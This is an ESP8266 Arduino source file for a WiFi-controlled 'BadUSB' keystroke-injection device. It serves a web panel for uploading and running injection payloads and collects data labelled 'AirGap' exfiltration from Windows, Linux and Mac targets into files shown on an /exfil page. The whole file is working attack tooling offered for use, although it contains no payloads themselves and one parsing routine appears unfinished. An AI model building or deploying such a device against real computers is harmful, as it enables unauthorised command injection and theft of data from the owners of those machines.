#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include "virtualkeyboard.h"
#include "livepayload.h"
#include "physicalkeyboard.h"
#include "uploadpayload.h"
#define BAUD_RATE 115200

// #########################################
// ############ Configuration ##############
// #########################################

const char *ssid = "WSD";
const char *password = "badUSBWifi";

const String HTML_CSS_STYLING = "<html><head><meta charset=\"utf-8\"><title>BadUsb_PControl</title><style>     body {     background-color: #333333;     font-family: \"Century Gothic\", Arial;     color: white;     margin: 20px;}.myButton:link, .myButton:visited {background: linear-gradient(#777777, #444444);color: white;padding: 4px;min-width: 100px;border-radius: 5px;border: 2px solid white;text-align: center;margin-right: 20px;text-decoration: none;display: inline-block;transition: 0.25s;}  .myButton:hover, .myButton:active {background: linear-gradient(#888888, #555555);border: 2px solid deepskyblue;border-radius: 10px;transform: scale(1.15);}</style></head><body><div id=\"header\"><div id=\"menu\"><ul><a class=\"myButton\" href=\"/\">Virtual Keyboard</a><a class=\"myButton\" href=\"/physicalkeyboard\">Physical Keyboard</a><a class=\"myButton\" href=\"/livepayload\">Live Payload</a><a class=\"myButton\" href=\"/uploadpayload\">Upload Payload</a><a class=\"myButton\" href=\"/listpayloads\">Choose Payload</a><a class=\"myButton\" href=\"/exfil\">Exfiltration</a></ul></div></div><hr>";
const String HTML_BACK_TO_INDEX = "<html><head><meta charset=\"UTF-8\"><title>BadUsb_PControl</title><style>body {background-color: #333333;font-family: \"Century Gothic\", Arial;color: white;margin: 20px;}  .myButton:link, .myButton:visited {background: linear-gradient(#777777, #444444);color: white;padding: 4px;min-width: 100px;border-radius: 5px;border: 2px solid white;text-align: center;margin-right: 20px;text-decoration: none;display: inline-block;transition: 0.25s;}  .myButton:hover, .myButton:active {background: linear-gradient(#888888, #555555);border: 2px solid deepskyblue;border-radius: 10px;transform:scale(1.15);}</style></head><body><div id=\"header\"><div id=\"menu\">     <ul><a class=\"myButton\" href=\"/\">Back to Index</a> </div></div><hr>";

IPAddress local_IP(192,168,1,1);
IPAddress gateway(192,168,1,1);
IPAddress subnet(255,255,255,0);

int DelayLength = 1000;
String webString;
char autopayload[64];
int livepayloaddelay;
char local_IPstr[16];

File fsUploadFile;
Dir dir = SPIFFS.openDir("/");

ESP8266WebServer server(80);

void runpayload() {
    File f = SPIFFS.open(autopayload, "r");
    int defaultdelay = DelayLength;
    int settingsdefaultdelay = DelayLength;
    int custom_delay;
    delay(livepayloaddelay);
    while(f.available()) {
      String line = f.readStringUntil('\n');
      line.replace("&lt;", "<");

      String fullkeys = line;
      int str_len = fullkeys.length()+1; 
      char keyarray[str_len];
      fullkeys.toCharArray(keyarray, str_len);

      char *i;
      String cmd;
      String cmdinput;
      cmd = String(strtok_r(keyarray," ",&i));
      
      delay(DelayLength);
      DelayLength = defaultdelay;
    }
    f.close();
    DelayLength = settingsdefaultdelay;
}

void handleFileUpload()
{
  if(server.uri() != "/upload") return;
  HTTPUpload& upload = server.upload();

  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    filename = "/payloads/"+filename;
    fsUploadFile = SPIFFS.open(filename, "w");
    filename = String();
  }
  else if(upload.status == UPLOAD_FILE_WRITE){
    if(fsUploadFile)
    fsUploadFile.write(upload.buf, upload.currentSize);
  }
  else if(upload.status == UPLOAD_FILE_END){
    if(fsUploadFile)
    fsUploadFile.close();
  }
}

void ListPayloads(){
  
  String FileList = HTML_BACK_TO_INDEX + "<h><b class=\"myButton\">Choose Payload:</b></h><br><br>";
  Dir dir = SPIFFS.openDir("/payloads");

  while (dir.next()) {
    String FileName = dir.fileName();
    File f = dir.openFile("r");
    FileList += " ";
    FileList += "<a class=\"myButton\" href=\"/showpayload?payload="+FileName+"\">"+FileName+"</a>"+"<br>";
  }
  server.send(200, "text/html", FileList);
}

void ListExfiltration() {
  String FileExfil = HTML_BACK_TO_INDEX + "<h><b>File Exfiltration:</b></h><br><br>";
  Dir dir = SPIFFS.openDir("/exfiltration");

  while (dir.next()) {
    String NameExfil = dir.fileName();
    File f = dir.openFile("r");
    FileExfil += " ";
    FileExfil += "<a class=\"myButton\" href=\"/showexfiltration?exfiltration="+NameExfil+"\">"+NameExfil+"</a>"+"<br>";
  }
  server.send(200, "text/html", FileExfil);
}

void setup() {
  Serial.begin(115200);
  SPIFFS.begin();
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  WiFi.softAPConfig(local_IP, gateway,subnet);

  if (SPIFFS.begin()){
    //ftpSrv.begin(ftp_username,ftp_password);
    dir = SPIFFS.openDir("/");
  }

  while (dir.next()) {
    String fileName = dir.fileName();
    size_t fileSize = dir.fileSize();
    Serial.printf("FS File: %s, size: %s\n", fileName.c_str(), String(fileSize).c_str());
    Serial.println();
  }

  server.on("/", []() {
    server.send_P(200, "text/html", VirtualKeyboard);
  });

  server.on("/format", [](){
    server.send(200, "text/html", HTML_BACK_TO_INDEX + "<h2>This will reformat the SPIFFS File System.</h2><br><h2>You will delete all Payloads! Are you sure?</h2><br><a href=\"/format/yes\">YES</a> - <a href=\"/\">NO</a>");
  });

  server.on("/format/yes", [](){
    server.send(200, "text/html", HTML_BACK_TO_INDEX + "<h2>Formatting file system: This may take up to 90 seconds</h2>");
    SPIFFS.format();
  });

  server.on("/listpayloads", ListPayloads);

  server.on("/exfil", ListExfiltration);

  server.onFileUpload(handleFileUpload);

  server.on("/showpayload", [](){
    webString="";
    String payload;
    payload += server.arg(0);
    File f = SPIFFS.open(payload, "r");
    String webString = f.readString();
    f.close();
    server.send(200, "text/html", HTML_BACK_TO_INDEX+ "<a style=\"text-decoration:none;\" href=\"/dopayload?payload="+payload+"\"><button class=\"myButton\">Run Payload</button></a><h2><pre>"+payload+"\n-----\n"+webString+"</pre></h2>");
    webString="";
  });

  server.on("/showexfiltration", [](){
    webString="";
    String tmp_exfil;
    tmp_exfil += server.arg(0);
    File f = SPIFFS.open(tmp_exfil, "r");
    String webString = f.readString();
    f.close();
    server.send(200, "text/html", HTML_BACK_TO_INDEX+tmp_exfil+"\"<h2><pre>"+tmp_exfil+"\n-----\n"+"\n"+webString+"\n"+"</pre></h2>");
    webString="";
  });

  server.on("/livepayload", []() {
    server.send_P(200, "text/html", LivePayload);
  });

  server.on("/physicalkeyboard", []() {
    server.send_P(200, "text/html", PhysicalKeyboard);
  });

  server.on("/uploadpayload", []() {
    server.send_P(200, "text/html", UploadPayload);
  });

  server.on("/upload", HTTP_POST, []() {
    server.send(200, "text/html", HTML_BACK_TO_INDEX + "<h2>Upload Successful!</h2><br><br><a class=\"myButton\" href=\"/listpayloads\">List Payloads</a>");
  });

  server.on("/runlivepayload", [](){
    String livepayload;
    livepayload += server.arg("livepayload");
    if (server.hasArg("livepayloadpresent")) {
      //server.send(200, "text/html", "<pre>Running live payload: <br>"+livepayload+"</pre>");
      char* splitlines;
      int payloadlen = livepayload.length()+1;
      char request[payloadlen];
      livepayload.toCharArray(request,payloadlen);
      splitlines = strtok(request,"\r\n");
      int defaultdelay = DelayLength;
      int settingsdefaultdelay = DelayLength;
      int custom_delay;
      delay(livepayloaddelay);
      while(splitlines != NULL)
      {
         String liveline=splitlines;
         liveline.replace("&lt;", "<");
         char *i;
         String cmd;
         String cmdinput;
         cmd = String(strtok_r(splitlines," ",&i));
         
         splitlines = strtok(NULL,"\r\n");       

         Serial.println(liveline);        

         delay(DelayLength);
         DelayLength = defaultdelay;  
      }
      DelayLength = settingsdefaultdelay;
      return 0;
    }
    else {
      server.send(200, "text/html", F("Type or Paste a payload and click \"Run Payload\"."));
    }
  });

  server.on("/dopayload", [](){
    String dopayload;
    dopayload += server.arg(0);
    server.send(200, "text/html", HTML_CSS_STYLING + "<pre><h3>Running payload: "+dopayload+"</h3></pre><br></body></html>");
    File f = SPIFFS.open(dopayload, "r");
    while(f.available()) {
      String line = f.readStringUntil('\n');
      Serial.println(line);
      delay(DelayLength); //delay between lines in payload, I found running it slower works best
    }
    f.close();
  });
    
  server.begin();
}

void loop() {
  server.handleClient();

  while (Serial.available()) {
    String cmd = Serial.readString();
    
    if(cmd.startsWith("ExfilWin")) {
      String serial = cmd;
      File f = SPIFFS.open("/exfiltration/ExfilWin.txt", "a");
      delay(5000);
      f.print("AirGap: ");
      f.println(serial);
      f.close();
    }

    else if(cmd.startsWith("ExfilNix")) {
      String serial = cmd;
      File f = SPIFFS.open("/exfiltration/ExfilNix.txt", "a");
      delay(5000);
      f.print("AirGap: ");
      f.println(serial);
      f.close();
    }

    else if(cmd.startsWith("ExfilMac")) {
      String serial = cmd;
      File f = SPIFFS.open("/exfiltration/ExfilMac.txt", "a");
      delay(5000);
      f.print("AirGap: ");
      f.println(serial);
      f.close();
    }

    else if(cmd.startsWith("OS")) {
      String os = cmd;
      File f = SPIFFS.open("/exfiltration/OS.txt", "a");
      f.println(os);
      f.close();
    }
  }
}
